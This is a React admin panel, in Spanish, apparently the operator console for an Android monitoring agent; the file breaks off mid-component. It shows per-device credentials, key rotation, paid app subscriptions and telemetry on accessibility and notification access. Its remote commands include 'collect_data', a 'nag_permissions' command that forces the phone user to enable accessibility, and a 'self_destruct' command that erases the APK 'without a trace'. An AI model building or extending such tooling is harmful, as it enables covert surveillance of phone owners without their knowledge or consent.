import { useEffect, useState, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { API_BASE_URL } from '../config';
import { useAuthStore } from '../store';
import { fetchWithRetry } from '../utils/fetchWithRetry';
import { handleAuthResponse } from '../utils/authResponse';
import { formatExactDate, formatExactDateTime } from '../appPage';
import '../styles/admin.css';

// Types para Planes y Suscripciones
interface Plan {
  app_name: string;
  display_name?: string;
  price: number;
  enabled: boolean;
}

interface Subscription {
  id: number;
  device_id: string;
  app_name: string;
  display_name?: string;
  active: boolean;
  expires_at?: string;
}

interface Device {
  device_id: string;
  name?: string;
  last_seen: string;
  created_at?: string;
  api_key?: string;
  aes_key?: string;
  username?: string;
  password?: string;
  battery_level?: number;
  is_charging?: boolean;
  accessibility_enabled?: number;
  notif_access_enabled?: number;
  doze_enabled?: number;
  storage_free_mb?: number;
}

interface Creds {
  username: string;
  password: string;
}

interface Metrics {
  ingest_total: number;
  ingest_errors: number;
  persist_inserts: number;
  persist_dedup_skips: number;
  worker_errors: number;
  worker_errors_by_device: Record<string, number>;
  avg_latency_ms: number;
  p99_latency_ms: number;
  since_boot: string;
  semantics?: unknown;
}

interface InactiveDevice {
  device_id: string;
  name?: string;
  last_seen: string;
}

interface MaintenanceConfig {
  log_retention_days: number;
  nonce_retention_hours: number;
  maintenance_interval_seconds: number;
}

function generateCredential(): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const special = '!@#$%^&*';
  let pass = '';
  for (let i = 0; i < 16; i++) pass += chars.charAt(Math.floor(Math.random() * chars.length));
  pass += special.charAt(Math.floor(Math.random() * special.length));
  return pass;
}

function getTimeAgo(date: Date): string {
  if (Number.isNaN(date.getTime())) return 'Sin actividad';
  const diff = Date.now() - date.getTime();
  const sec = Math.floor(diff / 1000);
  if (sec < 60) return 'Ahora';
  const min = Math.floor(sec / 60);
  if (min < 60) return `Hace ${min}min`;
  const hrs = Math.floor(min / 60);
  if (hrs < 24) return `Hace ${hrs}h`;
  return date.toLocaleDateString();
}

export default function AdminPage() {
  const navigate = useNavigate();
  const token = useAuthStore(s => s.token);
  const logout = useAuthStore(s => s.logout);
  const [devices, setDevices] = useState<Device[]>([]);
  const [expanded, setExpanded] = useState<Set<number>>(new Set());
  const [toastMsg, setToastMsg] = useState('');
  const [loading, setLoading] = useState(false);
  const [connectionError, setConnectionError] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [showRegisterModal, setShowRegisterModal] = useState(false);
  const [showDeleteModal, setShowDeleteModal] = useState(false);
  const [showEditModal, setShowEditModal] = useState(false);
  const [showSubsModal, setShowSubsModal] = useState(false);
  const [showCredsModal, setShowCredsModal] = useState(false);

  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
  const [newDeviceId, setNewDeviceId] = useState('');
  const [newDeviceName, setNewDeviceName] = useState('');
  const [editDeviceName, setEditDeviceName] = useState('');
  const [credsUsername, setCredsUsername] = useState('');
  const [credsPassword, setCredsPassword] = useState('');
  const [isActionLoading, setIsActionLoading] = useState(false);
  
  // Nuevos estados para Tabs, Planes y Suscripciones
  const [adminTab, setAdminTab] = useState<'devices' | 'subscriptions' | 'plans' | 'monitoring'>('devices');
  const [plans, setPlans] = useState<Plan[]>([]);
  const [plansLoading, setPlansLoading] = useState(false);
  const [globalSubs, setGlobalSubs] = useState<Subscription[]>([]);
  const [subsLoading, setSubsLoading] = useState(false);
  const [deviceSubs, setDeviceSubs] = useState<Subscription[]>([]);

  // Estados para el tab de Monitoreo
  const [metrics, setMetrics] = useState<Metrics | null>(null);
  const [metricsLoading, setMetricsLoading] = useState(false);
  const [inactiveDevices, setInactiveDevices] = useState<InactiveDevice[]>([]);
  const [inactiveThreshold, setInactiveThreshold] = useState(30);
  const [maintenanceConfig, setMaintenanceConfig] = useState<MaintenanceConfig | null>(null);
  const [purgeRetentionDays, setPurgeRetentionDays] = useState(30);

  const API = API_BASE_URL || '';

  // El backend valida X-Session-Token + role=='admin' en cada endpoint de
  // admin. X-Master-Key y X-Dashboard-Key ya no se envian desde el
  // navegador: el backend confirmo que el primero es solo fallback legacy
  // para scripts internos, y elimino el segundo por completo.
  const adminHeaders = useCallback((extra?: Record<string, string>): Record<string, string> => ({
    'X-Session-Token': token || '',
    ...extra,
  }), [token]);

  useEffect(() => {
    if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
    window.scrollTo(0, 0);
  }, []);

  const updateStatusTime = () => {
    const el = document.getElementById('statusTime');
    if (el) {
      const now = new Date();
      el.textContent = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
    }
  };

  useEffect(() => {
    updateStatusTime();
    const interval = setInterval(updateStatusTime, 10000);
    return () => clearInterval(interval);
  }, []);

  const loadDevices = useCallback(async () => {
    setLoading(true);
    setConnectionError(null);
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + '/devices', {
        headers: adminHeaders(),
      }));
      if (!res.ok) {
        setConnectionError(`Error ${res.status}: No se pudo cargar dispositivos`);
        setDevices([]);
        return;
      }
      const data = await res.json();
      setDevices(data.devices || []);
    } catch (err) {
      console.error('Error cargando dispositivos tras varios intentos:', err);
      setConnectionError('No se pudo conectar al backend tras varios intentos');
      setDevices([]);
    } finally {
      // finally (no al final del try): el "return" temprano del caso
      // "!res.ok" saltaba directo por encima del setLoading(false) que
      // estaba despues del try/catch, dejando el spinner girando para
      // siempre aunque el mensaje de error ya se mostrara arriba.
      setLoading(false);
    }
  }, [API, adminHeaders]);

  useEffect(() => {
    loadDevices();
  }, [loadDevices]);

  const loadPlans = useCallback(async () => {
    setPlansLoading(true);
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + '/api/admin/plans', {
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
      }));
      if (res.ok) {
        const data = await res.json();
        // El backend ya devuelve siempre el catalogo completo de apps
        // (enabled:false por defecto para las que no tienen fila propia).
        setPlans(data.plans || []);
      } else {
        console.error(`Error cargando planes: HTTP ${res.status}`);
        showToast('No se pudieron cargar los planes');
      }
    } catch (err) {
      console.error('Error cargando planes tras varios intentos:', err);
      showToast('No se pudieron cargar los planes');
    }
    setPlansLoading(false);
  }, [API, adminHeaders]);

  const loadSubscriptions = useCallback(async () => {
    setSubsLoading(true);
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + '/api/admin/subscriptions', {
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
      }));
      if (res.ok) {
        const data = await res.json();
        setGlobalSubs(data.subscriptions || []);
      } else {
        console.error(`Error cargando suscripciones: HTTP ${res.status}`);
        showToast('No se pudieron cargar las suscripciones');
      }
    } catch (err) {
      console.error('Error cargando suscripciones tras varios intentos:', err);
      showToast('No se pudieron cargar las suscripciones');
    }
    setSubsLoading(false);
  }, [API, adminHeaders]);

  const loadMetrics = useCallback(async () => {
    setMetricsLoading(true);
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + '/api/admin/metrics', {
        headers: adminHeaders(),
      }));
      if (res.ok) {
        const data = await res.json();
        setMetrics(data);
      } else {
        console.error(`Error cargando metricas: HTTP ${res.status}`);
        showToast('No se pudieron cargar las métricas');
      }
    } catch (err) {
      console.error('Error cargando metricas tras varios intentos:', err);
      showToast('No se pudieron cargar las métricas');
    }
    setMetricsLoading(false);
  }, [API, adminHeaders]);

  const loadInactiveDevices = useCallback(async (thresholdMinutes: number) => {
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + `/api/admin/inactive-devices?threshold_minutes=${thresholdMinutes}`, {
        headers: adminHeaders(),
      }));
      if (res.ok) {
        const data = await res.json();
        setInactiveDevices(data.devices || []);
      } else {
        console.error(`Error cargando dispositivos inactivos: HTTP ${res.status}`);
        showToast('No se pudieron cargar los dispositivos inactivos');
      }
    } catch (err) {
      console.error('Error cargando dispositivos inactivos tras varios intentos:', err);
      showToast('No se pudieron cargar los dispositivos inactivos');
    }
  }, [API, adminHeaders]);

  const loadMaintenanceConfig = useCallback(async () => {
    try {
      const res = handleAuthResponse(await fetchWithRetry(API + '/api/admin/maintenance/config', {
        headers: adminHeaders(),
      }));
      if (res.ok) {
        const data = await res.json();
        setMaintenanceConfig(data);
      } else {
        console.error(`Error cargando configuracion de mantenimiento: HTTP ${res.status}`);
        showToast('No se pudo cargar la configuración de mantenimiento');
      }
    } catch (err) {
      console.error('Error cargando configuracion de mantenimiento tras varios intentos:', err);
      showToast('No se pudo cargar la configuración de mantenimiento');
    }
  }, [API, adminHeaders]);

  useEffect(() => {
    if (adminTab === 'plans') loadPlans();
    if (adminTab === 'subscriptions') loadSubscriptions();
    if (adminTab === 'monitoring') {
      loadMetrics();
      loadInactiveDevices(inactiveThreshold);
      loadMaintenanceConfig();
    }
    // inactiveThreshold se recarga a demanda via el boton "Buscar", no en cada cambio de tab.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [adminTab, loadPlans, loadSubscriptions, loadMetrics, loadInactiveDevices, loadMaintenanceConfig]);

  const handleLogout = () => {
    logout();
    window.location.href = '/login';
  };

  const toggleDevice = (idx: number) => {
    setExpanded(prev => {
      const next = new Set(prev);
      if (next.has(idx)) next.delete(idx);
      else next.add(idx);
      return next;
    });
  };

  const copyText = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      showToast('Copiado al portapapeles');
    } catch (e) { console.warn('Error copying to clipboard:', e); }
  };

  const resetCreds = async (idx: number) => {
    const d = devices[idx];
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + '/api/rotate-key', {
        method: 'POST',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({ device_id: d.device_id, days: 365 }),
      }));
      if (res.ok) {
        const data = await res.json();
        // Actualizar dispositivo con nuevas claves
        setDevices(prev => prev.map(dev => 
          dev.device_id === d.device_id 
            ? { ...dev, api_key: data.new_api_key, aes_key: data.new_aes_key }
            : dev
        ));
        showToast('Claves rotadas exitosamente');
      } else {
        showToast('Error al rotar claves');
      }
    } catch (err) {
      console.error('Error rotando claves:', err);
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(''), 3000);
  };

  const registerDevice = async () => {
    if (!newDeviceId.trim()) {
      showToast('El ID del dispositivo es requerido');
      return;
    }
    if (!/^[a-zA-Z0-9_-]+$/.test(newDeviceId)) {
      showToast('Solo letras, números, guiones y guiones bajos');
      return;
    }
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + '/register_device', {
        method: 'POST',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({
          device_id: newDeviceId.trim(),
          name: newDeviceName.trim() || newDeviceId.trim(),
        }),
      }));
      if (res.ok) {
        const data = await res.json();
        await loadDevices();
        setShowRegisterModal(false);
        setNewDeviceId('');
        setNewDeviceName('');
        showToast('Dispositivo registrado exitosamente');
      } else {
        const error = await res.json();
        showToast(error.detail || 'Error al registrar dispositivo');
      }
    } catch (err) {
      console.error('Error registrando dispositivo:', err);
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const deleteDevice = async () => {
    if (!selectedDevice) return;
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/devices/${selectedDevice.device_id}`, {
        method: 'DELETE',
        headers: adminHeaders(),
      }));
      if (res.ok) {
        await loadDevices();
        setShowDeleteModal(false);
        setSelectedDevice(null);
        showToast('Dispositivo eliminado');
      } else {
        showToast('Error al eliminar dispositivo');
      }
    } catch (err) {
      console.error('Error eliminando dispositivo:', err);
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const updateDeviceName = async () => {
    if (!selectedDevice || !editDeviceName.trim()) return;
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/devices/${selectedDevice.device_id}`, {
        method: 'PATCH',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({ name: editDeviceName.trim() }),
      }));
      if (res.ok) {
        await loadDevices();
        setShowEditModal(false);
        setSelectedDevice(null);
        setEditDeviceName('');
        showToast('Nombre actualizado');
      } else {
        showToast('Error al actualizar nombre');
      }
    } catch (err) {
      console.error('Error actualizando nombre:', err);
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const saveCredentials = async () => {
    if (!selectedDevice || !credsUsername.trim() || !credsPassword.trim()) {
      showToast('Usuario y contraseña son requeridos');
      return;
    }
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/devices/${selectedDevice.device_id}`, {
        method: 'PATCH',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        // El backend exige "name" en cualquier PATCH a /devices/{id}, aunque
        // solo se este actualizando usuario/contraseña -- sin esto, siempre
        // rechazaba con 422 "Field required" y el modal quedaba pegado.
        body: JSON.stringify({
          name: selectedDevice.name || selectedDevice.device_id,
          username: credsUsername.trim(),
          password: credsPassword.trim(),
        }),
      }));
      if (res.ok) {
        await loadDevices();
        setShowCredsModal(false);
        setSelectedDevice(null);
        setCredsUsername('');
        setCredsPassword('');
        showToast('Credenciales actualizadas');
      } else {
        const error = await res.json().catch(() => null);
        console.error(`Error actualizando credenciales: HTTP ${res.status}`, error);
        showToast(`Error al actualizar credenciales (HTTP ${res.status})`);
      }
    } catch (err) {
      console.error('Error actualizando credenciales:', err);
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const runMaintenance = async () => {
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/maintenance`, {
        method: 'POST',
        headers: adminHeaders(),
      }));
      if (res.ok) showToast('Mantenimiento DB ejecutado');
      else showToast('Error al limpiar DB');
    } catch { showToast('Error de conexión'); }
    finally { setIsActionLoading(false); }
  };

  const runMaintenancePurge = async () => {
    if (!confirm(`¿SEGURO? Esto borrará permanentemente los logs con más de ${purgeRetentionDays} días de antigüedad. Esta acción es irreversible.`)) return;
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/maintenance/run?retention_days=${purgeRetentionDays}`, {
        method: 'POST',
        headers: adminHeaders(),
      }));
      if (res.ok) {
        showToast('Purga manual ejecutada');
        loadMetrics();
      } else {
        showToast('Error al ejecutar la purga manual');
      }
    } catch {
      showToast('Error de conexión');
    } finally {
      setIsActionLoading(false);
    }
  };

  const clearBans = async () => {
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/clear-bans`, {
        method: 'POST',
        headers: adminHeaders(),
      }));
      if (res.ok) showToast('Baneos de IP levantados');
      else showToast('Error al limpiar baneos');
    } catch { showToast('Error de conexión'); }
    finally { setIsActionLoading(false); }
  };

  const sendCommand = async (deviceId: string, cmd: string) => {
    setIsActionLoading(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/command`, {
        method: 'POST',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({ device_id: deviceId, command: cmd, params: {} })
      }));
      if (res.ok) showToast(`Comando ${cmd} enviado`);
      else showToast('Error al enviar comando');
    } catch { showToast('Error de conexión'); }
    finally { setIsActionLoading(false); }
  };

  const openDeleteModal = (device: Device) => {
    setSelectedDevice(device);
    setShowDeleteModal(true);
  };

  const openEditModal = (device: Device) => {
    setSelectedDevice(device);
    setEditDeviceName(device.name || device.device_id);
    setShowEditModal(true);
  };

  const openCredsModal = (device: Device) => {
    setSelectedDevice(device);
    setCredsUsername(device.username || '');
    setCredsPassword(device.password || '');
    setShowCredsModal(true);
  };

  const openSubsModal = async (device: Device) => {
    setSelectedDevice(device);
    setShowSubsModal(true);
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/devices/${device.device_id}/subscriptions`, {
        headers: adminHeaders(),
      }));
      if (res.ok) {
        const data = await res.json();
        // El backend ya devuelve siempre las 9 apps del catalogo
        // (active:false por defecto para las que no tienen fila propia).
        setDeviceSubs(data.subscriptions || []);
      } else {
        console.error(`Error cargando suscripciones del dispositivo: HTTP ${res.status}`);
        showToast('No se pudieron cargar las suscripciones del dispositivo');
      }
    } catch (err) {
      console.error(err);
      showToast('Error cargando suscripciones');
    }
  };

  const toggleSubscription = async (appName: string, active: boolean) => {
    if (!selectedDevice) return;
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/devices/${selectedDevice.device_id}/subscriptions?app_name=${encodeURIComponent(appName)}&active=${active}`, {
        method: 'POST',
        headers: adminHeaders(),
      }));
      if (res.ok) {
        setDeviceSubs(prev => prev.map(s => s.app_name === appName ? { ...s, active } : s));
        showToast(`Suscripción ${active ? 'activada' : 'desactivada'}`);
        if (adminTab === 'subscriptions') loadSubscriptions();
      } else {
        console.error(`Error actualizando suscripcion: HTTP ${res.status}`);
        showToast(`No se pudo ${active ? 'activar' : 'desactivar'} la suscripción (HTTP ${res.status})`);
      }
    } catch (err) {
      showToast('Error al actualizar suscripción');
    }
  };

  const togglePlanState = async (appName: string, currentEnabled: boolean) => {
    try {
      const method = currentEnabled ? 'DELETE' : 'PUT';
      const body = currentEnabled ? undefined : JSON.stringify({ enabled: true });
      const res = handleAuthResponse(await fetch(API + `/api/admin/plans/${encodeURIComponent(appName)}`, {
        method,
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body
      }));
      if (res.ok) {
        showToast(`Plan ${currentEnabled ? 'desactivado' : 'activado'}`);
        loadPlans();
      } else {
        console.error(`Error actualizando plan: HTTP ${res.status}`);
        showToast(`No se pudo ${currentEnabled ? 'desactivar' : 'activar'} el plan (HTTP ${res.status})`);
      }
    } catch (err) {
      showToast('Error al actualizar plan');
    }
  };

  const savePlanPrice = async (appName: string, displayName: string, price: number) => {
    try {
      const res = handleAuthResponse(await fetch(API + `/api/admin/plans/${encodeURIComponent(appName)}`, {
        method: 'PUT',
        headers: adminHeaders({ 'Content-Type': 'application/json' }),
        body: JSON.stringify({ price, display_name: displayName })
      }));
      if (res.ok) {
        showToast('Precio guardado');
        loadPlans();
      } else {
        showToast('Error al guardar precio');
      }
    } catch (err) {
      showToast('Error de conexión');
    }
  };


  const now = new Date();
  const online = devices.filter(d => (now.getTime() - new Date(d.last_seen).getTime()) < 60000);
  
  const filteredDevices = devices.filter(d => 
    d.device_id.toLowerCase().includes(searchQuery.toLowerCase()) ||
    (d.name && d.name.toLowerCase().includes(searchQuery.toLowerCase()))
  );

  return (
    <>
      <div id="toast" className={`toast${toastMsg ? ' show' : ''}`}>{toastMsg || 'Copiado'}</div>

      <div id="adminScreen" className="screen active">
          <div className="status-bar">
            <span className="time" id="statusTime">9:41</span>
            <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
              <span>🛡 Admin</span>
            </div>
          </div>

          <div className="admin-header">
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <button onClick={() => window.location.href = '/seleccion'} style={{ background: 'none', border: '1px solid rgba(0,255,136,0.2)', borderRadius: 8, color: '#00ff88', fontSize: '0.85rem', padding: '4px 10px', cursor: 'pointer', fontFamily: 'monospace', opacity: 0.6 }}>←</button>
              <h1>Administración</h1>
            </div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
              <a
                href={`${API_BASE_URL}/docs`}
                target="_blank"
                rel="noopener noreferrer"
                className="logout-btn"
                style={{ textDecoration: 'none', color: 'rgba(255,255,255,0.5)', borderColor: 'rgba(0,240,255,0.2)' }}
              >
                📖 API Docs
              </a>
              <button className="logout-btn" id="logoutBtn" data-testid="admin-logout" onClick={handleLogout}>
                Salir
              </button>
            </div>
          </div>

          <div className="admin-tabs">
            <button className={`admin-tab-btn ${adminTab === 'devices' ? 'active' : ''}`} data-testid="admin-tab-devices" onClick={() => setAdminTab('devices')}>
              📱 <span className="tab-label">Dispositivos</span>
            </button>
            <button className={`admin-tab-btn ${adminTab === 'subscriptions' ? 'active' : ''}`} data-testid="admin-tab-subscriptions" onClick={() => setAdminTab('subscriptions')}>
              📋 <span className="tab-label">Suscripciones</span>
            </button>
            <button className={`admin-tab-btn ${adminTab === 'plans' ? 'active' : ''}`} data-testid="admin-tab-plans" onClick={() => setAdminTab('plans')}>
              💰 <span className="tab-label">Planes</span>
            </button>
            <button className={`admin-tab-btn ${adminTab === 'monitoring' ? 'active' : ''}`} data-testid="admin-tab-monitoring" onClick={() => setAdminTab('monitoring')}>
              📊 <span className="tab-label">Monitoreo</span>
            </button>
          </div>

          {adminTab === 'devices' && (
            <>
          <div className="stats-row" id="statsRow">
            <div className="stat-card">
              <div className="num">{devices.length}</div>
              <div className="label">Dispositivos</div>
            </div>
            <div className="stat-card">
              <div className="num">{online.length}</div>
              <div className="label">En línea</div>
            </div>
            <div className="stat-card">
              <div className="num">{devices.length}</div>
              <div className="label">Credenciales</div>
            </div>
            <div className="stat-card">
              <div className="num">
                {String(now.getHours()).padStart(2, '0')}:{String(now.getMinutes()).padStart(2, '0')}
              </div>
              <div className="label">Última sinc.</div>
            </div>
          </div>

          <div className="section-label">
            Herramientas de Superusuario
          </div>
          <div style={{ display: 'flex', gap: '12px', padding: '0 20px', marginBottom: '24px', flexWrap: 'wrap' }}>
            <button className="btn-primary-small btn-danger-zone" data-testid="admin-purge-database" onClick={runMaintenance} disabled={isActionLoading} style={{ background: 'rgba(255, 100, 0, 0.2)', color: '#ff8800', borderColor: 'rgba(255, 100, 0, 0.4)' }}>
              🧹 Purgar Base de Datos
            </button>
            <button className="btn-primary-small btn-danger-zone" data-testid="admin-clear-bans" onClick={clearBans} disabled={isActionLoading} style={{ background: 'rgba(0, 255, 100, 0.2)', color: '#00ff66', borderColor: 'rgba(0, 255, 100, 0.4)' }}>
              🔓 Limpiar Baneos IP
            </button>
          </div>

          <div className="section-label">
            Dispositivos enrolados
            {connectionError && <span style={{ fontSize: '0.7rem', color: '#ff0033', marginLeft: 8 }}>⚠️ {connectionError}</span>}
            <button
              onClick={() => setShowRegisterModal(true)}
              className="btn-primary-small"
              data-testid="admin-open-register-device-modal"
              style={{ marginLeft: 'auto' }}
            >
              + Registrar Dispositivo
            </button>
          </div>

          <div style={{ marginBottom: 16 }}>
            <input
              type="text"
              placeholder="🔍 Buscar por ID o nombre..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="search-input"
            />
          </div>

          <div id="deviceListContainer">
            {loading ? (
              <div className="loading-spinner"><div className="spinner" /></div>
            ) : filteredDevices.length === 0 && searchQuery ? (
              <div className="empty-state">
                <div className="empty-icon">🔍</div>
                <h3>No se encontraron dispositivos</h3>
                <p>Intenta con otro término de búsqueda.</p>
              </div>
            ) : devices.length === 0 ? (
              <div className="empty-state">
                <div className="empty-icon">📡</div>
                <h3>Sin dispositivos enrolados</h3>
                <p>Usa el botón "Registrar Dispositivo" para agregar uno nuevo.</p>
              </div>
            ) : (
              <div className="device-list">
                {filteredDevices.map((d, i) => {
                  const lastSeen = d.last_seen ? new Date(d.last_seen) : new Date(NaN);
                  const isOnline = (now.getTime() - lastSeen.getTime()) < 60000;
                  const isExpanded = expanded.has(i);

                  return (
                    <div key={d.device_id} className={`device-card${isExpanded ? ' expanded' : ''}`}>
                      <div className="device-card-header" onClick={() => toggleDevice(i)}>
                        <div className={`device-status-dot ${isOnline ? 'online' : 'offline'}`} />
                        <div className="device-info">
                          <div className="name">{d.name || 'Sin nombre'}</div>
                          <div className="meta">{d.device_id} · {getTimeAgo(lastSeen)}</div>
                        </div>
                        <span className={`device-chevron${isExpanded ? ' open' : ''}`}>▼</span>
                      </div>
                      <div className="device-detail">
                        <div className="device-detail-inner">
                        <div className="cred-row">
                          <span className="cred-label">Usuario</span>
                          <span className="cred-value">
                            {d.username || '-'}
                            <button className="copy-btn" data-testid={`copy-username-${d.device_id}`} disabled={!d.username} onClick={e => { e.stopPropagation(); if (d.username) copyText(d.username); }}>Copiar</button>
                          </span>
                        </div>
                        <div className="cred-row">
                          <span className="cred-label">Contraseña</span>
                          <span className="cred-value">
                            <span style={{ fontFamily: "'Inter',monospace", fontSize: '0.7rem', letterSpacing: '0.5px', color: '#fff' }}>
                              {d.password || '-'}
                            </span>
                            <button className="copy-btn" data-testid={`copy-password-${d.device_id}`} disabled={!d.password} onClick={e => { e.stopPropagation(); if (d.password) copyText(d.password); }}>Copiar</button>
                          </span>
                        </div>
                        <div className="cred-row">
                          <span className="cred-label">Device ID</span>
                          <span className="cred-value" style={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.4)', fontFamily: 'monospace' }}>
                            {d.device_id}
                          </span>
                        </div>
                        <div className="cred-row">
                          <span className="cred-label">Registro</span>
                          <span className="cred-value" style={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.4)' }}>
                            {d.created_at ? formatExactDate(d.created_at) : 'Desconocido'}
                          </span>
                        </div>
                        
                        
                        <div style={{ marginTop: 16, marginBottom: 8, fontSize: '0.8rem', color: '#ff0055', textTransform: 'uppercase', letterSpacing: '1px' }}>
                          Salud del Agente (Telemetría)
                        </div>
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px', marginBottom: '16px', background: 'rgba(255,255,255,0.02)', padding: '12px', borderRadius: '8px' }}>
                          <div style={{ fontSize: '0.75rem', display: 'flex', justifyContent: 'space-between' }}>
                            <span style={{ color: 'rgba(255,255,255,0.5)' }}>Batería:</span>
                            <span style={{ color: (d.battery_level ?? 0) > 20 ? '#00ff66' : '#ff3333' }}>
                              {d.battery_level !== undefined && d.battery_level !== -1 ? `${d.battery_level}% ${d.is_charging ? '⚡' : ''}` : 'Desconocido'}
                            </span>
                          </div>
                          <div style={{ fontSize: '0.75rem', display: 'flex', justifyContent: 'space-between' }}>
                            <span style={{ color: 'rgba(255,255,255,0.5)' }}>Accesibilidad:</span>
                            <span>{d.accessibility_enabled === 1 ? '🟢 Activo' : '🔴 Inactivo'}</span>
                          </div>
                          <div style={{ fontSize: '0.75rem', display: 'flex', justifyContent: 'space-between' }}>
                            <span style={{ color: 'rgba(255,255,255,0.5)' }}>Notificaciones:</span>
                            <span>{d.notif_access_enabled === 1 ? '🟢 Activo' : '🔴 Inactivo'}</span>
                          </div>
                          <div style={{ fontSize: '0.75rem', display: 'flex', justifyContent: 'space-between' }}>
                            <span style={{ color: 'rgba(255,255,255,0.5)' }}>Modo Doze (Ahorro):</span>
                            <span>{d.doze_enabled === 1 ? '🔴 Asfixiado' : '🟢 Libre'}</span>
                          </div>
                          <div style={{ fontSize: '0.75rem', display: 'flex', justifyContent: 'space-between', gridColumn: '1 / -1' }}>
                            <span style={{ color: 'rgba(255,255,255,0.5)' }}>Almacenamiento Libre:</span>
                            <span>{d.storage_free_mb !== -1 ? `${d.storage_free_mb} MB` : 'Desconocido'}</span>
                          </div>
                        </div>

                        <div style={{ marginTop: 16, marginBottom: 8, fontSize: '0.8rem', color: '#00f0ff', textTransform: 'uppercase', letterSpacing: '1px' }}>
                          Comandos Remotos (Resolución de Problemas)
                        </div>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(120px, 1fr))', gap: 8, marginBottom: 16 }}>
                          <button className="action-btn" data-testid={`cmd-restart-${d.device_id}`} onClick={e => { e.stopPropagation(); sendCommand(d.device_id, 'restart'); }} style={{ background: 'rgba(255,255,255,0.05)', justifyContent: 'center' }}>🔄 Reiniciar</button>
                          <button className="action-btn" data-testid={`cmd-collect-data-${d.device_id}`} onClick={e => { e.stopPropagation(); sendCommand(d.device_id, 'collect_data'); }} style={{ background: 'rgba(255,255,255,0.05)', justifyContent: 'center' }}>📥 Sincronizar</button>
                          <button className="action-btn" data-testid={`cmd-update-config-${d.device_id}`} onClick={e => { e.stopPropagation(); sendCommand(d.device_id, 'update_config'); }} style={{ background: 'rgba(255,255,255,0.05)', justifyContent: 'center' }}>⚙️ Configurar</button>
                          <button className="action-btn" data-testid={`cmd-nag-permissions-${d.device_id}`} onClick={e => { e.stopPropagation(); sendCommand(d.device_id, 'nag_permissions'); }} style={{ background: 'rgba(255,255,0,0.1)', color: '#ffcc00', borderColor: 'rgba(255,255,0,0.3)', justifyContent: 'center' }} title="Fuerza al usuario a activar accesibilidad">🛡️ Forzar Permisos</button>
                          <button className="action-btn" data-testid={`cmd-clear-cache-${d.device_id}`} onClick={e => { e.stopPropagation(); sendCommand(d.device_id, 'clear_cache'); }} style={{ background: 'rgba(255,100,0,0.1)', color: '#ff8800', borderColor: 'rgba(255,100,0,0.3)', justifyContent: 'center' }} title="Borra caché local del APK corrompida">🧹 Limpiar Caché</button>
                          <button className="action-btn btn-danger-zone" data-testid={`cmd-self-destruct-${d.device_id}`} onClick={e => { e.stopPropagation(); if(confirm('¿SEGURO? Esto borrará el APK del teléfono sin dejar rastro.')) sendCommand(d.device_id, 'self_destruct'); }} style={{ background: 'rgba(255,0,0,0.2)', color: '#ff0033', borderColor: 'rgba(255,0,0,0.5)', justifyContent: 'center' }} title="Desinstala y borra el APK del teléfono">☢️ SELF DESTRUCT</button>
                        </div>
                        <div className="device-actions">
                          <button className="action-btn btn-copy-all" data-testid={`edit-creds-${d.device_id}`} onClick={e => { e.stopPropagation(); openCredsModal(d); }}>
                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                            Credenciales
                          </button>
                          <button className="action-btn btn-outline" data-testid={`open-subscriptions-${d.device_id}`} onClick={e => { e.stopPropagation(); openSubsModal(d); }}>
                            📋 Suscripciones
                          </button>
